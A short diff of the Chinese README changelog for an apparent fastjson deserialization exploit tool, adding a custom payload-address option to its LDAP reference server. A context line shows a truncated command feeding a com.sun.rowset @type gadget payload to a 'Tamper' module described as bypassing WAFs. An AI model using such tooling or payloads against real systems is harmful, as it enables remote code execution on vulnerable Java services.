@@ -17,7 +17,7 @@ java -cp fastjson_tool.jar fastjson.Tamper  "{\"abc\":{\"@type\":\"com.sun.rowse
 
 2021-03-31 新增：
 fastjson.Tamper : fastjson的一些特性，可以绕一些WAF
-fastjson.LDAPRefServerAuto : 新增了一些场景的回显
+fastjson.LDAPRefServerAuto : 新增了一些场景的回显, 选择payload的地址增加了自定义，格式: payload={.........}
 
 
 2020-10-30 新增：
